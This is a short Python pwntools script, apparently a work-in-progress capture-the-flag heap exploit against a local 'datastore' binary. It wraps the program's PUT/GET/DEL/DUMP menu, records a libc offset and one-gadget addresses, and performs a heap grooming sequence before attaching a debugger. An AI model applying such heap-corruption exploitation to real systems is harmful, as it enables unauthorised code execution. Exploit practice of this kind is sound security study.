from pwn import *
context(
	log_level='debug',
	binary='./datastore'
)
e=context.binary
libc=e.libc
io=process()

#=========================================
#Function

def dbg(script=''):
	gdb.attach(io,gdbscript=script)

def menu(func):
	io.sendlineafter('Enter command:\n',str(func))

def Get(book_name_size,book_name,book_des_size,book_des):
	menu('GET')
	io.sendlineafter('PROMPT: Enter row key:\n',str(book_name_size))

def Put(key,data_size,data):
	menu('PUT')
	io.sendlineafter('PROMPT: Enter row key:\n',str(key))
	io.sendlineafter('PROMPT: Enter data size:\n',str(data_size))
	io.sendlineafter('PROMPT: Enter data:\n',str(data))

def Dump():
	menu('DUMP')

def Del(key):
	menu('DEL')
	io.sendlineafter('PROMPT: Enter row key:\n',str(key))



#=========================================
#VAR
lib_off=5959696
gadget=[283158,283242,983716,987463]
#=========================================

Put('a',32,'A'*32)
Put('b',128,'b'*128)
Del('b')
Put('a',144,'A'*144)
dbg()

io.interactive()
